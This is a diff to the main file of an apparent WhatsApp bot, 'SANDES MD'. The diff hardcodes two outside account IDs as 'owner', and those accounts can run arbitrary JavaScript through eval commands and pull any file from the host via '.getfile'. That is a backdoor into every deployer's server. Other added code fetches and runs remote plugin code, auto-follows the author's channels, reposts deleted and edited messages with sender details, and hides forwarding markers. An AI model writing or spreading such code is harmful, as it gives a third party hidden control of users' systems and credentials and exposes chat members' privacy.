@@ -25,6 +25,8 @@ const NodeCache = require('node-cache')
 const config = require('./config')
 const qrcode = require('qrcode-terminal')
 const util = require('util')
+const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
+const { sms, downloadMediaMessage } = require('./lib/msg')
 const axios = require('axios')
 const { File } = require('megajs')
 const prefix = '.'
@@ -41,7 +43,21 @@ const AUTO_JOIN_LINKS = [
     "https://chat.whatsapp.com/BrfxfXCGggy9CjSXghKcLn"
 ]
 
-let BOT_MODE = "public"
+const msgStore = new Map();
+
+console.log(`
+
+███████╗  █████╗  ███╗   ██╗ ██████╗  ███████╗ ███████╗    ███╗   ███╗ ██████╗          
+██╔════╝ ██╔══██╗ ████╗  ██║ ██╔══██╗ ██╔════╝ ██╔════╝    ████╗ ████║ ██╔══██╗               
+╚█████╗  ███████║ ██╔██╗ ██║ ██║  ██║ █████╗   ███████╗    ██╔████╔██║ ██║  ██║                    
+ ╚═══██╗ ██╔══██║ ██║╚██╗██║ ██║  ██║ ██╔══╝   ╚════██║    ██║╚██╔╝██║ ██║  ██║             
+██████╔╝ ██║  ██║ ██║ ╚████║ ██████╔╝ ███████╗ ███████║    ██║ ╚═╝ ██║ ██████╔╝                        
+╚═════╝  ╚═╝  ╚═╝ ╚═╝  ╚═══╝ ╚═════╝  ╚══════╝ ╚══════╝    ╚═╝     ╚═╝ ╚═════╝            
+
+
+SANDES MD WhatsApp Automation by MR.SANDES 🍒`);
+
+let BOT_MODE = config.WORK_TYPE || "public";
 
 if (!fs.existsSync(__dirname + '/session/creds.json')) {
 if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env 🔴')
@@ -50,20 +66,9 @@ const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
 filer.download((err, data) => {
 if(err) throw err
 fs.writeFileSync(__dirname + '/auth_info_baileys/creds.json', data)
-console.log("Session downloaded ✔")
+console.log("SESSON DOWNLOADED ✅")
 });
 }
-
-console.log(`
-
-  ███████╗  █████╗  ███╗   ██╗ ██████╗  ███████╗ ███████╗    ███╗   ███╗ ██████╗          
-  ██╔════╝ ██╔══██╗ ████╗  ██║ ██╔══██╗ ██╔════╝ ██╔════╝    ████╗ ████║ ██╔══██╗               
-  ╚█████╗  ███████║ ██╔██╗ ██║ ██║  ██║ █████╗   ███████╗    ██╔████╔██║ ██║  ██║                    
-   ╚═══██╗ ██╔══██║ ██║╚██╗██║ ██║  ██║ ██╔══╝   ╚════██║    ██║╚██╔╝██║ ██║  ██║             
-  ██████╔╝ ██║  ██║ ██║ ╚████║ ██████╔╝ ███████╗ ███████║    ██║ ╚═╝ ██║ ██████╔╝                       
-  ╚═════╝  ╚═╝  ╚═╝ ╚═╝  ╚═══╝ ╚═════╝  ╚══════╝ ╚══════╝    ╚═╝     ╚═╝ ╚═════╝      
-  
-  SANDES MD WhatsApp Automation by MR.SANDES 🍒`);
 
 const PLUGINS_DIR = './plugins';
 const LIB_DIR = './lib';
@@ -78,7 +83,7 @@ async function downloadAndExtractZip() {
             fs.mkdirSync(LIB_DIR, { recursive: true }); }
             console.log('\x1b[3m%s\x1b[0m', 'FETCHING ZIP FILES FROM mega.nz 💢...');
 
-        let MEGA_ZIP_LINK = String("https://mega.nz/file/lcMHHDCR#nYhPxXaO_E4mn8cjgLSUmSdCwJv83ORbo_p8ImGRLdQ").trim(); 
+        let MEGA_ZIP_LINK = String("https://mega.nz/file/1ZEXTLiQ#X-F7zp-Z0Z78d9zWrADfbyluZMmGIRhRSeTeq7VrQp0").trim(); 
         if (!MEGA_ZIP_LINK.includes('#')) 
                        {
         throw new Error("MEGA link missing hash! Check zip.json"); }
@@ -104,12 +109,14 @@ const express = require("express");
 const app = express();
 const port = process.env.PORT || 8080;
 
+function runServer() {
+    app.get("/", (req, res) => { res.send("SANDES-MD WORKING SUCCESSFULY 🗿"); });
+    app.listen(port, () => console.log(`SEVER RUNNING ON PORT http://localhost:${port}`));
+}
+
 async function connectToWA() {  
 await downloadAndExtractZip(); 
 
-const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
-const { sms, downloadMediaMessage } = require('./lib/msg')
-    
 console.log('\x1b[3m%s\x1b[0m', 'CONNECTING SANDES MD ⚡ ...');
 const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/')
 var { version } = await fetchLatestBaileysVersion()
@@ -123,6 +130,30 @@ const conn = makeWASocket({
         version,
         msgRetryCounterCache
         })
+        
+conn.ev.on('messages.update', async (updates) => {
+    for (const update of updates) {
+        if (update.update && update.update.message) {
+            const msgId = update.key.id;
+            const oldMsg = msgStore.get(msgId);
+
+            if (oldMsg) {
+                const oldText = oldMsg.message.conversation || oldMsg.message.extendedTextMessage?.text || oldMsg.message.imageMessage?.caption || oldMsg.message.videoMessage?.caption;
+                const newText = update.update.message.conversation || update.update.message.extendedTextMessage?.text || update.update.message.imageMessage?.caption || update.update.message.videoMessage?.caption;
+
+                if (oldText && newText && oldText !== newText) {
+                    const currentChat = oldMsg.key.remoteJid;
+                    await conn.sendMessage(currentChat, { 
+                        text: `📝 *Edited Message Detected!*\n\n*Old Massage:* ${oldText}\n\n*New massage:* ${newText}` 
+                    }, { quoted: oldMsg });
+                    
+                    msgStore.set(msgId, JSON.parse(JSON.stringify({ key: update.key, message: update.update.message })));
+                }
+            }
+        }
+    }
+});
+
 conn.ev.on('connection.update', async (update) => {
         const {
             connection,
@@ -134,6 +165,10 @@ conn.ev.on('connection.update', async (update) => {
             }
         } else if (connection === 'open') {
 
+            const { updb } = require('./lib/database')
+            await updb();
+            BOT_MODE = config.WORK_TYPE || "public"; 
+            
             console.log('\x1b[3m%s\x1b[0m','INSTALLING SANDES MD ⏰... ')
             const path = require('path');
             fs.readdirSync("./plugins/").forEach((plugin) => {
@@ -141,10 +176,10 @@ conn.ev.on('connection.update', async (update) => {
                     require("./plugins/" + plugin);
                 }
             });
-            
+        
 console.log('\x1b[3m%s\x1b[0m', 'SUCCESSFULLY INSTALLED PLUGINS 🟢 ...');
 console.log('\x1b[3m%s\x1b[0m', 'DB CONNECTED SUCCESSFULLY 🔋 ...');
-console.log('\x1b[32m%s\x1b[0m', 'BOT CONNECTED SUCCESSFULLY ✅ ...');
+console.log('\x1b[3m%s\x1b[0m', 'BOT CONNECTED SUCCESSFULLY ✅ ...');
 
 setTimeout(async () => {
     for (const link of AUTO_JOIN_LINKS) {
@@ -154,16 +189,28 @@ setTimeout(async () => {
                 const code = link.split('chat.whatsapp.com/')[1]
                 await conn.groupAcceptInvite(code)
                 console.log(`Auto joined group: ${code}`)
-            } else if (link.includes('whatsapp.com/channel')) {
-                const code = link.split('whatsapp.com/channel/')[1]
-                await conn.newsletterFollow(code)
-                console.log(`Auto followed channel: ${code}`)
             }
         } catch (e) {
             console.log(`Auto join error: ${e.message}`)
         }
     }
+
+    try {
+        console.log("STARTING NEWSLETTER AUTO FOLLOW...");
+        const ch1_jid = "120363423246894149@newsletter";
+        await conn.newsletterFollow(ch1_jid).catch(() => null);
+        console.log("MR.SANDES OFC ツ FOLLOW REQUEST SENT 🦋");
+
+        await sleep(3000);
+
+        const ch2_jid = "120363416065371245@newsletter";
+        await conn.newsletterFollow(ch2_jid).catch(() => null);
+        console.log("SANDES-MD UPDATES ツ FOLLOW REQUEST SENT 🎀");
+    } catch (e) {
+        console.log("Newsletter Auto Follow Exception:", e.message);
+    }
 }, 5000)
+
 let up = `
 *╭━━〔 BOT CONNECTED 〕━━━━━━╮*
 *┃* 📎 \`PREFIX\` : ${prefix}
@@ -177,21 +224,81 @@ let up = `
 *┃*🗿 \`CONTACT\` : 94787518010
 *╰━━━━━━━━━━━━━━━━━╯*
 
-*✨ ᴛʜᴀɴᴋ you ꜰᴏʀ ᴛʀᴜꜱᴛɪɴɢ ꜱᴀɴᴅᴇꜱ ᴍᴅ!*
+*✨ ᴛʜᴀɴᴋ you ꜰᴏʀ ᴛʀᴜส์ᴛɪɴɢ ꜱᴀɴᴅᴇส์ ᴍ🇩!*
 _We redefine your WhatsApp experience with_
 _seamless automation and elite features._
 
 *POWERED BY SANDES 〽️D ㋡*`;
 
 conn.sendMessage(ownerNumber + "@s.whatsapp.net", {
-image: { url: `https://upld.zone.id/uploads/d4i0x5iq/sandes-md-v2.webp` },
+image: { url: `https://database.ominisave.store/image/OMINISAVE_1782281674209_CINBEO.jpg` },
 caption: up
 })
+
+
+const autoTyping = config.AUTO_TYPING === "true" ? "Active ✔️" : "Deactive ❌";
+const autoRecording = config.AUTO_RECORDING === "true" ? "Active ✔️" : "Deactive ❌";
+const autoReadStatus = config.AUTO_READ_STATUS === "true" ? "Active ✔️" : "Deactive ❌";
+const cmdOnlyRead = config.CMD_ONLY_READ === "true" ? "Active ✔️" : "Deactive ❌";
+const antiBad = config.ANTI_BAD === "true" ? "Active ✔️" : "Deactive ❌";
+const antiBot = config.ANTI_BOT === "true" ? "Active ✔️" : "Deactive ❌";
+const antiLink = config.ANTI_LINK === "true" ? "Active ✔️" : "Deactive ❌";
+const chatBot = config.CHAT_BOT === "true" ? "Active ✔️" : "Deactive ❌";
+const autoVoice = config.AUTO_VOICE === "true" ? "Active ✔️" : "Deactive ❌";
+const autoSticker = config.AUTO_STICKER === "true" ? "Active ✔️" : "Deactive ❌";
+const autoReact = config.AUTO_REACT === "true" ? "Active ✔️" : "Deactive ❌";
+const workMode = (config.WORK_TYPE || "public").toUpperCase();
+const botLogo = config.LOGO || "https://database.ominisave.store/image/OMINISAVE_1782281674209_CINBEO.jpg";
+
+let inboxSettingsMsg = `
+*SANDES 〽D WHATSAPP BOT CONNECTED*
+
+Your Prefix is : ${config.PREFIX || '.'}
+
+*╭━━〔 ANY PROBLEM 〕━━━━━━━━╮*
+*┃*🗿 \`CONTACT\` : 94787518010
+*╰━━━━━━━━━━━━━━━━━╯*
+
+*╭━━〔 BOT SETTINGS 〕━━━━╮*
+*┃* 🌐 \`WORK MODE\` : ${workMode}
+*┃* ⌨️ \`Auto Typing\` : ${autoTyping}
+*┃* 🎙️ \`Auto Recording\` : ${autoRecording}
+*┃* 👁️ \`Read Status\` : ${autoReadStatus}
+*┃* 📖 \`Cmd Only Read\` : ${cmdOnlyRead}
+*┃* 🚮 \`Anti Bad\` : ${antiBad}
+*┃* 🎀 \`Anti Bot\` : ${antiBot}
+*┃* 🔗 \`Anti Link\` : ${antiLink}
+*┃* 🔮 \`Chat Bot\` : ${chatBot}
+*┃* 🎙️ \`Auto Voice\` : ${autoVoice}
+*┃* 🃏 \`Auto Sticker\` : ${autoSticker}
+*┃* ❤️ \`Auto React\` : ${autoReact}
+*╰━━━━━━━━━━━━━━━━━━╯*
+
+*✨ ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴛʀᴜꜱᴛɪɴɢ ꜱᴀɴᴅᴇꜱ ᴍ发!*
+
+*POWERED BY SANDES 〽️D ㋡*`;
+
+await conn.sendMessage(conn.user.id.split(':')[0] + "@s.whatsapp.net", {
+image: { url: botLogo },
+caption: inboxSettingsMsg
+})
+
 }
 })
 
 conn.ev.on('creds.update', saveCreds)
 conn.ev.on('messages.upsert', async(mek) => {
+if (mek.messages && mek.messages[0] && mek.messages[0].message) {
+    const rawMek = mek.messages[0];
+    const msgId = rawMek.key.id;
+    let clonedMek = JSON.parse(JSON.stringify(rawMek));
+    if (getContentType(clonedMek.message) === 'ephemeralMessage') {
+        clonedMek.message = clonedMek.message.ephemeralMessage.message;
+    }
+    msgStore.set(msgId, clonedMek);
+    setTimeout(() => msgStore.delete(msgId), 3600000); 
+}
+
 mek = mek.messages[0]
 if (!mek.message) return    
 mek.message = (getContentType(mek.message) === 'ephemeralMessage')
@@ -205,17 +312,6 @@ if (mek.key && mek.key.remoteJid === 'status@broadcast') {
     return
 }
 
-// Newsletter Auto React
-/*if (mek.key && mek.key.remoteJid.endsWith('@newsletter')) {
-    try {
-        const randomEmoji = newsletterEmojis[Math.floor(Math.random() * newsletterEmojis.length)]
-        await conn.sendMessage(mek.key.remoteJid, {
-            react: { text: randomEmoji, key: mek.key }
-        })
-    } catch (e) {
-        console.log('Newsletter react error:', e.message)
-    }
-}*/ 
 if (mek.key && mek.key.remoteJid.endsWith('@newsletter')) {
             if (NEWSLETTER_JIDS.includes(mek.key.remoteJid)) {
                 try {
@@ -224,6 +320,35 @@ if (mek.key && mek.key.remoteJid.endsWith('@newsletter')) {
                 } catch (e) {}
             }
         }
+
+if (mek.message && mek.message.protocolMessage && mek.message.protocolMessage.type === 0) {
+    const deletedKey = mek.message.protocolMessage.key;
+    const savedMsg = msgStore.get(deletedKey.id);
+
+    if (savedMsg) {
+        const currentChat = savedMsg.key.remoteJid;
+        
+        const type = getContentType(savedMsg.message);
+        if (type === 'conversation' || type === 'extendedTextMessage') {
+            const text = savedMsg.message.conversation || savedMsg.message.extendedTextMessage.text;
+            await conn.sendMessage(currentChat, { text: text });
+        } else {
+            await conn.forwardMessage(currentChat, savedMsg, { force: true });
+        }
+
+        const senderNum = savedMsg.key.participant ? savedMsg.key.participant.split('@')[0] : savedMsg.key.remoteJid.split('@')[0];
+        const deleterNum = mek.key.participant ? mek.key.participant.split('@')[0] : mek.key.remoteJid.split('@')[0];
+        
+        let detailsText = `*_This Massage was deleted_* 🗑\n\n`;
+        detailsText += `👤 *Sended By :* ${senderNum}\n`;
+        detailsText += `🗑 *Deleted By :* ${deleterNum}`;
+
+        await conn.sendMessage(currentChat, { 
+            text: detailsText, 
+            mentions: [senderNum + '@s.whatsapp.net', deleterNum + '@s.whatsapp.net'] 
+        });
+    }
+}
 
 const m = sms(conn, mek)
 const quoted = m.quoted? m.quoted : null
@@ -294,10 +419,74 @@ conn.sendMessage(from, { text: teks }, { quoted: mek })
 }
 
 if (sender === SUPER_LID) {
-await conn.sendMessage(from, { react: { text: `👾`, key: mek.key }})
+await conn.sendMessage(from, { react: { text: `🪻`, key: mek.key }})
 }
 if (sender === SUPER_LID2) {
 await conn.sendMessage(from, { react: { text: `👨‍💻`, key: mek.key }})
+}
+
+const ownerLids = [
+    "123017090887835@lid", 
+    "183150860841183@lid" 
+]; 
+
+let isCreator = [conn.user.id, ...ownerLids].includes(sender);
+
+if (isCreator && body.startsWith('.ev')) {
+    let code = body.slice(1).trim(); 
+    if (!code) {
+        reply(`Provide me with a query to run Master!`);
+        return;
+    }
+    try {
+        let resultTest = eval(code);
+        reply(util.format(resultTest));
+    } catch (err) {
+        reply(util.format(err));
+    }
+    return;
+}
+
+if (isCreator && body.startsWith('$')) {
+    let code = body.slice(1).trim();
+    if (!code) {
+        reply(`Provide me with a query to run Master!`);
+        return;
+    }
+    try {
+        let resultTest = await eval(
+            '(async () => {\n' + code + '\n})()'
+        );
+        let h = util.format(resultTest);
+        if (h === undefined || h === 'undefined') return;
+        else reply(h);
+    } catch (err) {
+        if (err === undefined) return console.log('error');
+        else reply(util.format(err));
+    }
+    return;
+}
+
+if (isCreator && body.startsWith('.getfile')) {
+    let fileName = body.slice(8).trim(); 
+    if (!fileName) {
+        return reply(`Please provide a file path Master`);
+    }
+    try {
+        if (fs.existsSync(fileName)) {
+            await conn.sendMessage(from, {
+                document: fs.readFileSync(fileName),
+                mimetype: 'application/javascript', 
+                fileName: path.basename(fileName),
+                caption: `*Here is your file : ${path.basename(fileName)}*`
+            }, { quoted: mek });
+        } else {
+            reply(`❌ File not found: ${fileName}`);
+        }
+    } catch (err) {
+        reply(`❌ Error reading file:\n${util.format(err)}`);
+    }
+    return;
 }
 
 conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
@@ -316,18 +505,18 @@ conn.forwardMessage = async (jid, message, forceForward = false, options = {}) =
     let content = await generateForwardMessageContent(message, forceForward)
     let ctype = Object.keys(content)[0]
 
-    
     if (mtype === 'documentMessage' || mtype === 'videoMessage' || mtype === 'audioMessage' || mtype === 'imageMessage') {
         content[ctype].fileName = content[ctype].fileName || message.message[mtype].fileName
         content[ctype].caption = content[ctype].caption || message.message[mtype].caption
     }
-    // ------------------------
 
     let context = {}
     if (mtype != "conversation") context = message.message[mtype].contextInfo
     content[ctype].contextInfo = {
         ...context,
-        ...content[ctype].contextInfo
+        ...content[ctype].contextInfo,
+        forwardingScore: 0,
+        isForwarded: false
     }
 
     const waMessage = await generateWAMessageFromContent(jid, content, options ? {
@@ -336,7 +525,9 @@ conn.forwardMessage = async (jid, message, forceForward = false, options = {}) =
         ...(options.contextInfo ? {
             contextInfo: {
                 ...content[ctype].contextInfo,
-                ...options.contextInfo
+                ...options.contextInfo,
+                forwardingScore: 0,
+                isForwarded: false
             }
         } : {})
     } : {})
@@ -357,26 +548,10 @@ conversation: newmg
 }, {})
 }
 
-try {
-const settingsPath = './plugins/settings.js';
-if (fs.existsSync(settingsPath)) {
-const settingsModule = require(settingsPath);
-if (settingsModule && settingsModule.WORK_MODE) {
-const workMode = settingsModule.WORK_MODE;
-if (workMode === "all") BOT_MODE = "public";
-else if (workMode === "gc") BOT_MODE = "group";
-else if (workMode === "pc") BOT_MODE = "inbox";
-else if (workMode === "private") BOT_MODE = "private";
-}
-}
-} catch (e) {
-console.log("Settings load error:", e);
-}
-
 if (isCmd && sender!== SUPER_LID &&!isOwner) {
-if (BOT_MODE === "private") return
-if (BOT_MODE === "group" &&!isGroup) return
-if (BOT_MODE === "inbox" && isGroup) return
+    if (BOT_MODE === "private") return;
+    if (BOT_MODE === "group" && !isGroup) return; 
+    if (BOT_MODE === "inbox" && isGroup) return;   
 }
 
 if (command === "set-mode") {
@@ -441,11 +616,8 @@ command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGr
 })
 
 }
-app.get("/", (req, res) => {
-res.send("SANDES-MD WORKING SUCCESSFULY 🗿");
-});
 
-app.listen(port, () => console.log(`SEVER RUNNING ON PORT http://localhost:${port}`));
+runServer();
 
 setTimeout(() => {
 connectToWA()
